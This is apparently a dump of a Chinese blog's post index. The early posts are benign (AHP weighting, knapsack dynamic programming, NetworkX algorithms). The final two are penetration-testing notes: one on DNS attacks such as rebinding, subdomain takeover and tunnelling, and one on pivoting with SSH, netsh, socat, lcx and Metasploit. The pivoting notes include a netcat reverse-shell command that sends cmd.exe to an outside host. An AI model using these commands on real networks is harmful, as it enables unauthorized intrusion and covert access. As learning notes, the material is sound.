b.sum(axis=1) # 每一行的特征向量 # print(b_axis_1_sum) w = b_axis_1_sum / row # 归一化处理(特征向量) nw = w * row AW = (w * array).sum(axis=1) # print(AW) max_max = sum(AW / (row * w)) # print(max_max) CI = (max_max - row) / (row - 1) CI_list.append(CI) CR = CI / RI_dict[row] if CR &lt; 0.1: # print(round(CR, 3)) # print('满足一致性') # print(np.max(w)) # print(sorted(w,reverse=True)) # print(max_max) # print('特征向量:%s' % w) return w else: print(round(CR, 3)) print('不满足一致性，请进行修改')def main(array): if type(array) is np.ndarray: return get_w(array) else: print('请输入numpy对象')if __name__ == '__main__': e = np.array([[1, 2, 7, 5, 5], [1 / 2, 1, 4, 3, 3], [1 / 7, 1 / 4, 1, 1 / 2, 1 / 3], [1 / 5, 1 / 3, 2, 1, 1], [1 / 5, 1 / 3, 3, 1, 1]]) #准则层成对比较矩阵 a = np.array([[1, 1 / 3, 1 / 8], [3, 1, 1 / 3], [8, 3, 1]]) #三个候选方案针对准则1的比较矩阵 b = np.array([[1, 2, 5], [1 / 2, 1, 2], [1 / 5, 1 / 2, 1]]) #三个候选方案针对准则2的比较矩阵 c = np.array([[1, 1, 3], [1, 1, 3], [1 / 3, 1 / 3, 1]]) #三个候选方案针对准则3的比较矩阵 d = np.array([[1, 3, 4], [1 / 3, 1, 1], [1 / 4, 1, 1]]) #三个候选方案针对准则4的比较矩阵 f = np.array([[1, 4, 1 / 2], [1 / 4, 1, 1 / 4], [2, 4, 1]]) #三个候选方案针对准则5的比较矩阵 e = main(e) a = main(a) b = main(b) c = main(c) d = main(d) f = main(f) try: res = np.array([a, b, c, d, f]) #计算总排序的一致性 fina_RI=RI_dict[a.shape[0]] fina_CI=CI_list[1:] fina_CR=sum(np.array(fina_CI)/fina_RI*e) if fina_CR&lt;1: ret = (np.transpose(res) * e).sum(axis=1) print(ret) else: print('计算总排序的一致性不符合要求') except TypeError: print('数据有误，可能不满足一致性，请进行修改') [0.31878206 0.23919592 0.44202202] 在这个例子中我们可以看到权重最高的第三项将会是我们选择的方案。 参考文献[1] http://www.cnblogs.com/yhll/yhll/p/9967726.html[2] https://zhuanlan.zhihu.com/p/39993228]]></content>
  </entry>
  <entry>
    <title><![CDATA[数模之动态规划]]></title>
    <url>%2F2018%2F12%2F26%2F%E6%95%B0%E6%A8%A1%E4%B9%8B%E5%8A%A8%E6%80%81%E8%A7%84%E5%88%92%2F</url>
    <content type="text"><![CDATA[第一次比较感性的认识动态规划的时候是在一年多以前的数据结构课堂上。初始的时候觉得特别绕，虽然现在也一样，那些年看的动态规划，只还记得一句话：全局最优包含局部最优。现在重新梳理动态规划的有关知识，对这句话有了更深的理解。动态规划的思想就是至下而上分析，从上而下推导的过程。这句话相当的绕，甚至是个病句。如果这样理解动态规划就会舒服很多：假如我要到达一个目的地，我需要从目的地出发分析我的每一步最优解来指导我从初始地出发的航向，这样我们通常能够到达全局的最优。说到这个概念，我们往往会把贪心和动态规划来做一个对比。贪心算法也是一个通过子结构的最优化策略来指导我们直达最终解的算法。但是二者有着本质的差别：贪心的子结构最优化是根据自定义的策略，从上而下的解决方案。也就是说贪心的最优化子结构是“目光短且”的只看下一步，将最优化选取策略作用于未来一步。这样的效果就是，最后往往很难达到最优解，但是可以得一个尚可的解。而动态规划恰恰相反，他从结果出发构建最优结构，层层递推，指导我们从上而下直到抵达最优解。 一开始的引言说了一堆“哲学”问题。下面来总结一下动态规划问题的相关“知识点”。（敲黑板，画重点!逃~） 动态规划基础动态规划从实现的程序结构上看，可以分为递归和非递归。 带备忘录的递归形式，这种方式直接从原问题出发，遇到子问题就去求解子问题并存储子问题的解，下次遇到的时候直接取出来，问题求解的过程看起来就像是先自顶向下地展开问题，然后自下而上的进行决策； 迭代方式，这种方式需要考虑如何给定一个子问题的求解方式，使得后面求解规模较大的问题是需要求解的子问题都已经求解好了，直接从以计算好的最优子结构状态中取出值进行新状态值的更新，这样就可以避免较多的重复计算子问题。 从实现的难易程度上来看，递归方式更为符号人脑逻辑思考，是最直接的实现形式。但是由于递归结构会造成栈空间剧增，真正的程序实现中一般不使用递归。有句话说得好：能不用递归就不用递归。迭代的方式相比起来比较费脑力，不太好实现。当然这是我这样的小白的感悟，大神估计都不会这样想。因为后面基本上都是使用迭代的方式，所以这里给出个使用python装饰器实现的备忘录递归解决斐波那契数列问题，让我们对这个方式有个直观的认识。（代码是从网上索罗的） 1234567891011121314151617from functools import wrapsdef memo(func): cache=&#123;&#125; @wraps(func) def wrap(*args): if args not in cache: cache[args]=func(*args) return cache[args] return wrap@memodef fib(i): if i&lt;2: return 1 return fib(i-1)+fib(i-2)fib(10) 89 在看数模指导书的时候，看到这样一句话：动态规划没有统一的标准模型，也没有构造模型的通用方法，甚至还没有判断一个问 题能否构造动态规划模型的准则。这样就只能对每类问题进行具体分析，构造具体的模 型。对于较复杂的问题在选择状态、决策、确定状态转移规律等方面需要丰富的想象力 和灵活的技巧性，这就带来了应用上的局限性。虽然不知道水深如何，但是这句话或多或少让我们对动态规划的灵活性有了一定的认识。但是优秀的前辈经过一些实践总结，对动态规划问题做了一些模型抽象。动态规划问题总的来说可以抽象出这两个重要组件：状态和状态转移方程。 状态（state）：很好理解，我们需要将待解决问题抽象成很多个状态，每个状态代表了一个子结构。 状态转移方程（state transition equation）：描述状态间转化关系的的表达式，包括状态转移需要满足的条件。 很多时候只要我们能够从问题出发，抽象出以上两个组件。那么运用动态规划解决问题就是板上钉钉的事情了。动态规划难在哪呢？以作者不成熟的理解，其一：就是对状态的抽象，我们需要将实践的问题抽象到一个个状态，每个状态互不重叠。其二：描述每个状态转移的条件和方程式。动态规划没有统一的标准模型，就体现在不同的问题有不同的状态转移方程式，条件也不尽相同。 对动态规划的具体概念仍有模糊的话可以去看下参考链接[2]的那篇博文，里面有个入门级硬币的例子，作者翻译得很好。 常见的动态规划问题在对动态规划问题有了一定的理解后，我们来看看常见的动态规划问题的状态和状态转移方程式如何构造的。当然作者才疏，无法概括所有的问题，参看链接[1]里面有一些大佬搜集的动态规划的解题思路和代码，有兴趣的话可以去看下。作为出学者，仅列出几个背包类求解问题的思路。 0/1背包问题每个物品只有一件，取或者不取（0/1），只有者两种选择。 状态转移方程： f[i][v]=max{f[i-1][v],f[i-1][v-c[i]]+w[i]} 第i件物品的费用是c[i]，价值是w[i],f[i][v]表示前i件物品恰放入一个容量为v的背包可以获得的最大价值。 123456789101112131415161718192021222324def ZeroOnePack(N, V, weight, value): """ 0-1 背包问题(每个物品只能取0次, 或者1次) :param N: 物品个数, 如 N=5 :param V: 背包总容量, 如V=15 :param weight: 每个物品的容量数组表示, 如weight=[5,4,7,2,6] :param value: 每个物品的价值数组表示, 如value=[12,3,10,3,6] :return: 返回最大的总价值 """ # 初始化f[N+1][V+1]为0, f[i][j]表示前i件物品恰放入一个容量为j的背包可以获得的最大价值 f = [[0 for col in range(V+1)] for row in range(N+1)] for i in range(1, N+1): for j in range(1, V+1): if j&lt;weight[i-1]: # 总容量j小于物品i的容量时，直接不考虑物品i f[i][j] = f[i-1][j] else: # 注意由于weight、value数组下标从0开始，第i个物品的容量为weight[i-1],价值为value[i-1] f[i][j] = max(f[i-1][j], f[i-1][j-weight[i-1]]+value[i-1]) # 状态方程 max_value = f[N][V] return max_valueprint(ZeroOnePack(5,15,[5,4,7,2,6],[12,3,16,3,6])) 31 完全背包问题所不同的是每种物品有无限件。所以引入变量k，表示选取k件。 状态转移方程： f[i][v]=max{f[i-1][v-kc[i]]+kw[i]|0&lt;=k*c[i]&lt;=v} 123456789101112131415161718192021222324252627def CompletePack(N, V, weight, value): """ 完全背包问题(每个物品可以取无限次) :param N: 物品个数, 如 N=5 :param V: 背包总容量, 如V=15 :param weight: 每个物品的容量数组表示, 如weight=[5,4,7,2,6] :param value: 每个物品的价值数组表示, 如value=[12,3,10,3,6] :return: 返回最大的总价值 """ # 初始化f[N+1][V+1]为0，f[i][j]表示前i件物品恰放入一个容量为j的背包可以获得的最大价值 f = [[0 for col in range(V + 1)] for row in range(N + 1)] for i in range(1, N+1): for j in range(1, V+1): # 注意由于weight、value数组下标从0开始，第i个物品的容量为weight[i-1],价值为value[i-1] # V//weight[i-1]表示物品i最多可以取多少次 f[i][j] = f[i - 1][j] # 初始取k=0为最大，下面的循环是把取了k个物品i能获得的最大价值赋值给f[i][j] for k in range(j//weight[i-1]+1): if f[i][j] &lt; f[i-1][j-k*weight[i-1]]+k*value[i-1]: f[i][j] = f[i-1][j-k*weight[i-1]]+k*value[i-1] # 状态方程 # 上面的f[i][j]也可以通过下面一行代码求得 # f[i][j] = max([f[i-1][j-k*weight[i-1]]+k*value[i-1] for k in range(j/weight[i-1]+1)]) max_value = f[N][V] return max_valueprint(CompletePack(5,15,[5,4,7,2,6],[12,3,16,3,6])) 36 多重背包问题增加了商品的个数限制。所以引入数组n[i],表述第i件商品的最大个数 状态转移方程： f[i][v]=max{f[i-1][v-kc[i]]+kw[i]|0&lt;=k&lt;=n[i]} 1234567891011121314151617181920212223242526272829def MultiplePack(N, V, weight, value, num): """ 多重背包问题(每个物品都有次数限制) :param N: 物品个数, 如 N=5 :param V: 背包总容量, 如V=15 :param weight: 每个物品的容量数组表示, 如weight=[5,4,7,2,6] :param value: 每个物品的价值数组表示, 如value=[12,3,10,3,6] :param num: 每个物品的个数限制，如num=[2,4,1,5,3] :return: 返回最大的总价值 """ # 初始化f[N+1][V+1]为0，f[i][j]表示前i件物品恰放入一个容量为j的背包可以获得的最大价值 f = [[0 for col in range(V + 1)] for row in range(N + 1)] for i in range(1, N+1): for j in range(1, V+1): # 对于物品i最多能取的次数是j/weight[i-1]与num[i-1]中较小者 max_num_i = min(j//weight[i-1], num[i-1]) f[i][j] = f[i - 1][j] # 初始取k=0为最大，下面的循环是把取了k个物品i能获得的最大价值赋值给f[i][j] for k in range(max_num_i+1): if f[i][j] &lt; f[i-1][j-k*weight[i-1]]+k*value[i-1]: f[i][j] = f[i-1][j-k*weight[i-1]]+k*value[i-1] # 状态方程 # 上面的f[i][j]也可以通过下面一行代码求得 # f[i][j] = maxbf[i-1][j-k*weight[i-1]]+k*value[i-1] for k in range(max_num_i+1)]) max_value = f[N][V] return max_valueprint(MultiplePack(5,15,[5,4,7,2,6],[12,3,16,3,6],[2,4,1,5,3])) 31 更多的背包问题，可以参看背包问题九讲（参考文献【3】）。 参考[1]https://github.com/billryan/algorithm-exercise/tree/master/zh-hans/dynamic_programming[2]http://www.hawstein.com/posts/dp-novice-to-advanced.html[3]https://www.kancloud.cn/kancloud/pack]]></content>
  </entry>
  <entry>
    <title><![CDATA[数模之图论算法]]></title>
    <url>%2F2018%2F12%2F26%2F%E6%95%B0%E6%A8%A1%E4%B9%8B%E5%9B%BE%E8%AE%BA%E7%AE%97%E6%B3%95%2F</url>
    <content type="text"><![CDATA[图论是一个很庞大的理论分支，涉及到的算法很多。前面已经了解到了NetworkX这个很强大的图论计算库，里面内置了很多的算法，可以用来解决实际生活中的问题。这篇文章主要介绍三种图论中的基础算法，算法代码是从参考文献中直接引用的，这里做个记录。 关键路径要说明这个问题，先摆三个概念： 以顶点表示事件 以有向边表示活动 边上的权值表示活动的开销 而关键路径指的就是遍历整个图中从既定的起点到终点的路劲，权重和做大的一条路径。关键活动就是其路径上的边。可以形象的理解，在一个工程项目中，我们往往需要找到影响工程时间的关键路径，那么对关键路径进行优化，就可以缩短时间啊，提高效率。下面是一个利用继承NetworkX的原生类实现的计算关键路径和关键活动的例子。 123456789101112131415161718192021222324252627282930313233343536373839404142434445464748495051525354555657585960616263646566676869707172737475767778798081828384858687888990919293949596979899100101102103104105106107108109110111112113114115116117118119120121122123124125class CPM(nx.DiGraph): def __init__(self): super().__init__() self._dirty = True self._critical_path_length = -1 self._criticalPath = None def add_node(self, *args, **kwargs): self._dirty = True super().add_node(*args, **kwargs) def add_nodes_from(self, *args, **kwargs): self._dirty = True super().add_nodes_from(*args, **kwargs) def add_edge(self, *args): # , **kwargs): self._dirty = True super().add_edge(*args) # , **kwargs) def add_edges_from(self, *args, **kwargs): self._dirty = True super().add_edges_from(*args, **kwargs) def remove_node(self, *args, **kwargs): self._dirty = True super().remove_node(*args, **kwargs) def remove_nodes_from(self, *args, **kwargs): self._dirty = True super().remove_nodes_from(*args, **kwargs) def remove_edge(self, *args): # , **kwargs): self._dirty = True super().remove_edge(*args) # , **kwargs) def remove_edges_from(self, *args, **kwargs): self._dirty = True super().remove_edges_from(*args, **kwargs) #根据前向拓扑排序算弧的最早发生时间 def _forward(self): for n in nx.topological_sort(self): es = max([self.node[j]['EF'] for j in self.predecessors(n)], default=0) self.add_node(n, ES=es, EF=es + self.node[n]['duration']) #根据前向拓扑排序算弧的最迟发生时间 def _backward(self): #for n in nx.topological_sort(self, reverse=True): for n in list(reversed(list(nx.topological_sort(self)))): lf = min([self.node[j]['LS'] for j in self.successors(n)], default=self._critical_path_length) self.add_node(n, LS=lf - self.node[n]['duration'], LF=lf) #最早发生时间=最迟发生时间,则判断该节点为关键路径上的关键活动 def _compute_critical_path(self): graph = set() for n in self: if self.node[n]['EF'] == self.node[n]['LF']: graph.add(n) self._criticalPath = self.subgraph(graph) @property def critical_path_length(self): if self._dirty: self._update() return self._critical_path_length @property def critical_path(self): if self._dirty: self._update() return sorted(self._criticalPath, key=lambda x: self.node[x]['ES']) def _update(self): self._forward() self._critical_path_length = max(nx.get_node_attributes(self, 'EF').values()) self._backward() self._compute_critical_path() self._dirty = False if __name__ == "__main__": #构建graph G = CPM() G.add_node('A', duration=5) G.add_node('B', duration=2) G.add_node('C', duration=4) G.add_node('D', duration=4) G.add_node('E', duration=3) G.add_node('F', duration=7) G.add_node('G', duration=4) G.add_edges_from([ ('A', 'B'), ('A', 'C'), ('C','D'), ('C','E'), ('C','G'), ('B','D'), ('D','F'), ('E','F'), ('G','F'), ]) pos=nx.spring_layout(G) #显示graph edge_labels = nx.get_edge_attributes(G,'duration') nx.draw_networkx_nodes(G,pos) nx.draw_networkx_labels(G,pos) nx.draw_networkx_edges(G,pos) nx.draw_networkx_edge_labels(G, pos,edge_labels) plt.title('AOE网络') plt.axis('on') plt.xticks([]) plt.yticks([]) plt.show() print('关键活动为:') print(G.critical_path_length, G.critical_path) G.add_node('D', duration=2) print('\n修改D活动持续时间4为2后的关键活动为:') print(G.critical_path_length, G.critical_path) 关键活动为: 20 [&#39;A&#39;, &#39;C&#39;, &#39;D&#39;, &#39;G&#39;, &#39;F&#39;] 修改D活动持续时间4为2后的关键活动为: 20 [&#39;A&#39;, &#39;C&#39;, &#39;G&#39;, &#39;F&#39;] 最大流问题最大流问题，说的是在图中，边为约束，也即从其前继节点到后继节点的最大流量。那么最大流问题，就是选定一个初始节点,目地节点，计算它们间的最大流量，使其满足路径上的所有约束。以下是使用NetworkX实现的求解最大流问题的代码。 12345678910111213141516171819202122232425262728293031323334import networkx as nximport matplotlib.pyplot as pltplt.rcParams['font.sans-serif']=['SimHei'] #用来正常显示中文标签plt.rcParams['axes.unicode_minus']=False #用来正常显示负号#构建graph G = nx.DiGraph() G.add_edge('x','a', capacity=3.0) G.add_edge('x','b', capacity=1.0) G.add_edge('a','c', capacity=3.0) G.add_edge('b','c', capacity=5.0) G.add_edge('b','d', capacity=4.0) G.add_edge('d','e', capacity=2.0) G.add_edge('c','y', capacity=2.0) G.add_edge('e','y', capacity=3.0) pos=nx.spring_layout(G) #显示graph edge_labels = nx.get_edge_attributes(G,'capacity') nx.draw_networkx_nodes(G,pos) nx.draw_networkx_labels(G,pos) nx.draw_networkx_edges(G,pos) nx.draw_networkx_edge_labels(G, pos,edge_labels) plt.axis('on') plt.xticks([]) plt.yticks([]) plt.show() #求最大流 flow_value, flow_dict = nx.maximum_flow(G, 'x', 'y') print("最大流值: ",flow_value) print("最大流流经途径: ",flow_dict) 最大流值: 3.0 最大流流经途径: {&#39;x&#39;: {&#39;a&#39;: 2.0, &#39;b&#39;: 1.0}, &#39;a&#39;: {&#39;c&#39;: 2.0}, &#39;b&#39;: {&#39;c&#39;: 0, &#39;d&#39;: 1.0}, &#39;c&#39;: {&#39;y&#39;: 2.0}, &#39;d&#39;: {&#39;e&#39;: 1.0}, &#39;e&#39;: {&#39;y&#39;: 1.0}, &#39;y&#39;: {}} 拓扑排序拓扑排序面对的问题是那些节点间具有明显的先后时序性的问题。可以这么直观的理解：我们大学有很多课程，其中一些课程需要有先修课，就如同概率论和高数。那么我们必须先学习高数才可以学概率论。这样的问题就十分适合使用拓扑排序算法。它就是找出我们学习根据先后顺序依次列出节点的过程。算法本身采用减边的策略。所以可能会出现很多种不同的序列，但是都是合理的拓扑排序。 12345678910111213141516171819DG = nx.DiGraph([('a', 'b'), ('a', 'c'),('b', 'e'), ('b', 'd'),('c', 'e'), ('c', 'd'),('d', 'f'), ('f', 'g'), ('e', 'g')]) #显示graph nx.draw_spring(DG,with_labels=True) plt.title('有向无环图') plt.axis('on') plt.xticks([]) plt.yticks([]) plt.show() #这个graph拓扑排序序列有很多，可以直接列出一个排序，也可以把所有列出#列出一个print('扑排序序列:\n ',list(nx.topological_sort(DG))) #列出所有print("所有可能的拓扑排序:")for i in list(nx.all_topological_sorts(DG)): print(i)#逆拓扑排序print('逆扑排序序列:\n',list(reversed(list(nx.topological_sort(DG))))) 扑排序序列: [&#39;a&#39;, &#39;c&#39;, &#39;b&#39;, &#39;d&#39;, &#39;f&#39;, &#39;e&#39;, &#39;g&#39;] 所有可能的拓扑排序: [&#39;a&#39;, &#39;c&#39;, &#39;b&#39;, &#39;d&#39;, &#39;f&#39;, &#39;e&#39;, &#39;g&#39;] [&#39;a&#39;, &#39;c&#39;, &#39;b&#39;, &#39;d&#39;, &#39;e&#39;, &#39;f&#39;, &#39;g&#39;] [&#39;a&#39;, &#39;c&#39;, &#39;b&#39;, &#39;e&#39;, &#39;d&#39;, &#39;f&#39;, &#39;g&#39;] [&#39;a&#39;, &#39;b&#39;, &#39;c&#39;, &#39;d&#39;, &#39;f&#39;, &#39;e&#39;, &#39;g&#39;] [&#39;a&#39;, &#39;b&#39;, &#39;c&#39;, &#39;d&#39;, &#39;e&#39;, &#39;f&#39;, &#39;g&#39;] [&#39;a&#39;, &#39;b&#39;, &#39;c&#39;, &#39;e&#39;, &#39;d&#39;, &#39;f&#39;, &#39;g&#39;] 逆扑排序序列: [&#39;g&#39;, &#39;e&#39;, &#39;f&#39;, &#39;d&#39;, &#39;b&#39;, &#39;c&#39;, &#39;a&#39;] 参考资料[1]https://www.cnblogs.com/wushaogui/p/9222828.html]]></content>
  </entry>
  <entry>
    <title><![CDATA[常见的DNS攻击手段]]></title>
    <url>%2F2018%2F12%2F23%2F%E5%B8%B8%E8%A7%81%E7%9A%84DNS%E6%94%BB%E5%87%BB%E6%89%8B%E6%AE%B5%2F</url>
    <content type="text"><![CDATA[DNS记录往往展示了一个公司或者企业的整个网络拓扑结构，所以一些针对DNS的攻击往往会给渗透测试带来意料之外的惊喜。加速对渗透对象的网络拓扑理解，有利于利用对象网络的薄弱环节，甚至对后渗透阶段带来意想不到的收益。 对DNS的攻击手段在理解DNS相关的攻击方式之前，对DNS相关知识还是比较有必要的，推荐去看下参考文献第四个链接，作为DNS的前置科普，可以让我们比较快速入门，当然最好是自己去实现搭建一下域名服务器，特别是主从域名服务器，这样会让我们对DNS有更深入的理解，配置主从服务器可以参考一下参考链接【5】。接下来说一下笔者了解到的一些攻击或者说利用方式，DNS域传送，子域名劫持，DNS缓存毒化，DNS劫持，DNS 重绑定,DNS ddos，DNS tunneling…… DNS 重绑定要完成DNS重绑定攻击，我们需要一个域名，并且将这个域名的解析指定到我们自己的DNS Server，在我们的可控的DNS Server上编写解析服务，设置TTL时间为0。这样就可以进行攻击了，完整的攻击流程为：1234567(1)、服务器端获得URL参数，进行第一次DNS解析，获得了一个非内网的IP(2)、对于获得的IP进行判断，发现为非黑名单IP，则通过验证(3)、服务器端对于URL进行访问，由于DNS服务器设置的TTL为0，所以再次进行DNS解析，这一次DNS服务器返回的是内网地址。(4)、由于已经绕过验证，所以服务器端返回访问内网资源的结果。 DNS重绑定主要用在ssrf绕过ip检测这样或者类似的场景，它可以给我们提供一个绕过正则，让服务器访问内部网络的目的。 DNS 域传送所谓的DNS域传送，其实是在主从DNS服务器架构下的一种漏洞。它的原理其实相当简单，在在部署主从服务器的时候，从属服务器一般都需要向主服务器查询同步数据信息，在DNS中就是更新同步记录表。既然要同步记录表，那么自然主服务器需要把从服务器的查询结果如实给出。那么在qurry_allow的设置上如果弄成any,毫无疑问将会泄露整个网站的ip拓扑，给渗透利用带来方便。 DNS子域名劫持所谓的DNS子域名劫持，指的就是域名服务其下有一个子域名使用了第三方的云服务，业务到期了，准确的说是废用了，但是在企业内部的DNS记录上还有相关记录，这里的记录主要是CNAME方式，这样一来，我们可以去相关云服务商申请相关的服务，来填补企业DNS空缺的CNAME记录，这样一来，我们就成功的接管了公司旗下一个废除的子域名。有了这个子域名的控制权，我们用来绕过浏览器CSP策略，或者进行钓鱼等相关活动。危害还是相当大的。但是注意到这种利用方式不是百发百中，因为有些云服务商是不允许你修改其服务的URI的，这样一来，我们就无法申请一个相同的URI，使其指向之前的DNS CNAME记录。 DNS 欺骗（DNS 投毒）DNS存在缓存机制，DNS缓存大致有两种：本地缓存，DNS服务器多级缓存。注意到一般情况下我们欺骗的是本地缓存，因为本地缓存的欺骗成本比较低，而且比较可控，一打一个准。DNS服务器缓存一般是指我们控制了一个域下的DNS服务器，那么我们可以所有以这台服务器作为首次查询的用户都被缓存投毒。下面主要说一下本地DNS缓存投毒。我们可以通过本地DNS缓存投毒，去进行钓鱼(Ettercap)，远程访问的持久化（BeEF）,投放广告，等等。本地DNS投毒有两种方向：1.直接操作系统层面的缓存，如中间人劫持（参考这篇文章：http://r00tshell.lofter.com/post/3d2f21_18839d8）；2.利用好浏览器缓存。（其实二者殊途同归，最后都是到系统级缓存，浏览器缓存算是系统缓存的一个子集）。浏览器缓存控制机制有两种：HTML Meta标签 以及HTTP头信息，通常，web开发者可以在HTML页面的节点中加入标签。在BeEF里面有一套自动化的利用方式。当然也有其他的工具可以使用。只不过浏览器攻击工具首推BeEF。 DNS ddos这个攻击方式估计是最最直白的攻击手段了，直接泛洪ddos，让DNS服务器拒绝服务，可以说是相当的简单粗暴。有篇安全牛的文章对这类攻击的防御手段给出了建议：https://www.aqniu.com/learn/14769.html DNS tunnel这里不算是个漏洞，只能说是一个企业边界规则指定不合理造成的。因为一般内网向外的UDP 53端口流量是进行DNS查询的，出于正常的业务逻辑，这里应该不会存在安全隐患。但是DNS协议支持较大的载荷，那么攻击者完全可以利用DNS协议来搭建DNS隧道，实现内网穿透。而且也有相当一部分成熟的工具可以实现自动化。常见的有dns2tcp，iodine等。 参考资料[1] https://www.sans.org/reading-room/whitepapers/dns/securing-dns-zone-transfer-868[2] https://security.stackexchange.com/questions/10452/dns-zone-transfer-attack[3] https://www.alibabacloud.com/help/zh/faq-detail/37529.html[4] http://www.ruanyifeng.com/blog/2016/06/dns.html[5] https://www.cnblogs.com/kevingrace/p/7060119.html[6] http://www.4hou.com/web/13129.html]]></content>
      <categories>
        <category>web</category>
      </categories>
      <tags>
        <tag>web</tag>
        <tag>DNS</tag>
        <tag>渗透</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[内网渗透中的端口转发]]></title>
    <url>%2F2018%2F12%2F22%2F%E5%86%85%E7%BD%91%E6%B8%97%E9%80%8F%E4%B8%AD%E7%9A%84%E7%AB%AF%E5%8F%A3%E8%BD%AC%E5%8F%91%2F</url>
    <content type="text"><![CDATA[需要知道，在渗透的整个流程中，根据web应用或者开放的端口进行渗透，获取webshell只是渗透这门艺术的一小部分，在真实的错综复杂的企业环境中进行内网渗透，其实水很深，涉及内网穿透，端口转发，域渗透，提权等一系列的难题。所以这篇文章对内网渗透学习进行一些记录。在这过程中参考了很多前辈们的宝贵经验，我把这些链接进行了收集，放在参考文献部分。 转发，映射，代理这几个概念其实是比较难区分的，特别是和后面的内网穿透混在一起，在宏观上说，他们差别不大。但是究其本质还是存在不小的差别的。现在就先对这几个概念说一下我个人的理解： 转发： 转发是渗透中一种手段，是将一个网络端口从一个网络节点转发到另一个节点的行为。结果是使一个外网用户经过一个NAT路由器到达在内网IP地址某个端口。有时候也被称为隧道。 映射： 映射也是渗透中的一种手段，端口映射就是将外网主机的IP地址的一个端口映射到内网中一台机器，提供相应的服务。其实很多时候转发和映射 代理： 代理是一种结果，以端口转发和映射为技术基础。代理在很多场合是用在连接互联网的web服务上面，起到突破ip封锁，隐匿身份等作用。其原理是动态的端口转发。只需要本机和代理间建立一个隧道，然后代理就可以根据本机发起的请求去动态的获取出链的地址与端口。 内网穿透： 内网穿透是目的，它使用的手段有包括端口转发和映射，或者直接使用代理这一结果。很多时候我们指的内网穿透场景是指攻击机与靶机处于处于不同的内网中，一些回弹shell之类的手段直接实现，因为IP地址无法相互建立连接。这个时候就需要使用一些内网穿透常见的工具。这些工具也是使用端口转发和映射或类似的方法来突破限制。 工具名称 主要用途 平台 备注 lcx 端口映射 Windows 只支持tcp协议的端口转发，非系统内置。linux下叫做可以实现端口转发和端口映射 netsh 端口映射 Windows 只支持tcp协议的端口转发，需要安装ipv6 rinetd 反向代理 Linux 非内置，需要自行安装 Earthworm 端口映射、Socks5代理 Linux、Windows、MacOS、Arm-Linux 非系统内置，可以十分方便的支持多级转发 frp 高性能的反向代理应用 go 基于反向代理，可以十分灵活的进行内网穿透，绕过防火墙 reGeorg Socks5 代理 常见脚本语言 reGeorg利用webshell建立一个socks代理进行内网穿透，服务器必须支持aspx、php、jsp、js等web语言 Metasploit portfwd 端口映射 MSF -&gt; Metpreter会话 需要网络状况较好 socat 端口映射 Linux 可能需要安装 Metasploit-&gt;socks4a 反向代理 MSF -&gt; Metpreter会话 需要会话主机有外网代理IP tunna HTTP隧道 常见脚本语言 需脚本环境执行，并且不太稳定 localtuuel 内网公网映射 nodojs 和ngork一样可以实现内网到公网端口的映射 ngork 内网公网映射 go 可以选择自建服务器或则和使用工具自带的服务器 dns2tcp DNS隧道 kaii内置 防火墙过滤内部tcp出站策略的情况下，走DNS隧道，，通过DNS流量中继TCP连接 Iodine DNS隧道 linux 原理上和dns2tcp类似 icmpsh ICMP隧道 需要root权限 需要禁止系统对icmp的相应，用工具来处理收发icmp包 系统内置的转发工具iptables NAT功能由于linux主机出于安全考虑，系统参数/proc/sys/net/ipv4/ip_forward默认为0，所以是禁止NAT功能的，我们可以通过以下两种你方式修改系统运行时的参数。 临时方案echo 1 &gt;/proc/sys/net/ipv4/ip_forward 长期方案运行vi /etc/sysctl.conf123# 找到下面的值并将0改成1net.ipv4.ip_forward = 1 运行sysctl –p，使改动立即生效 。 下面是一个转发的示例123456# 1.1.1.1是公网ip,192.168.2.2内网ipiptables -t nat -A PREROUTING -p tcp -d 1.1.1.1 --dport 80 -j DNAT --to-destination 192.168.2.2:8080iptables -t nat -A POSTROUTING -p tcp -s 192.168.2.2 --sport 8080 -j SNAT --to-source 1.1.1.1service iptables save 这样就会使得访问1.1.1.1：80 映射到了192.168.2.2：8080端口。注意到这里 nc12345# 公网主机nc -lvp 4444# 内网机器nc -t -e cmd.exe 公网主机ip 4444 SSH1234567891011#本地端口转发:ssh -CfNg -L port1:127.0.0.1:port2 user@host 参数： -L 本地网卡地址:本地端口:目标地址:目标端口#远程端口转发： ssh -CfNg -R port2:127.0.0.1:port1 user@hsst参数： -R 远程网卡地址:远程端口:目标地址:目标端口#动态端口转发ssh -D localhost:2000 root@103.59.22.17参数：-D 本地网卡地址:本地端口 netshnetsh是windows下提供网络管理的命令行工具，它是一个交互式的shell,涉及到上下文的概念。我们在交互式下面进入相应的上下文，进行参数的设置。也可以直接下面这样非交互式的进行端口转发。123456netsh interface ipv6 install#转发netsh interface portproxy add v4tov4 listenaddress=10.10.18.1 listenport=4455 connectaddress=10.10.12.1 connectport=8080#删除转发netsh interface portproxy delete v4tov4 listenaddress=&#123;B的IP&#125; listenport=&#123;B的端口&#125; 非内置的端口转发工具socatsocat这个端口转发我们其实更常用在ssrf构造payload的时候本地抓包，因为socat有记录转发流的功能。将socat作为中介捕获我们构造的payload包，然后进行进一步的操作，如gopher协议的构造。12345678910111213#安装yum install -y socatapt install -y socat #TCP nohup socat TCP4-LISTEN:10000,reuseaddr,fork TCP4:1.1.1.1:10000TCP4-LISTEN:10000 监听 ipv4 的 10000TCP 端口。 10000 改成你自己需要转发的端口fork TCP4:1.1.1.1:10000 转发到 1.1.1.1 的 10000 端口，根据需求修改自行修改 ip 和端口nohup 后台运行。可以把这个命令写到 /etc/rc.local 里面开机启动启动。#UDPnohup socat -T 600 UDP4-LISTEN:10000,reuseaddr,fork UDP4:1.1.1.1:10000 lcx.exe123456789101112131415161718lcx-&lt;listen|tran|slave&gt; &lt;option&gt; [-log logfile][option:] -listen &lt;监听端口&gt; &lt;转发端口&gt; -tran&lt;监听端口&gt; &lt;目标地址&gt; &lt;目标端口&gt; -slave &lt;目标主机&gt; &lt;目标端口&gt; &lt;本地主机&gt;&lt;本机端口&gt; 内网机器上执行：lcx.exe –slave 公网IP +端口 内网IP +端口例: lcx.exe –slave 192.168.43.142 51 192.168.43.137 3389公网上执行：Lcx.exe –listen 监听51端口，转发到公网机器的3389端口例: Lcx.exe –listen 51 3389 Metasploit socks4a一组在实际渗透过程中的三件套：路由表+socks4a+proxychains。这样一来可以使用攻击机上的渗透工具，利用meterpreter session作为跳板，对内网进行渗透。下面的是流程。123451. 在反弹的shell中添加路由，如run autoroute -s 192.168.122.0/242. 使用socks4a模块并设置端口use auxiliary/server/socks4a3. 配置proxychains Meterpreter 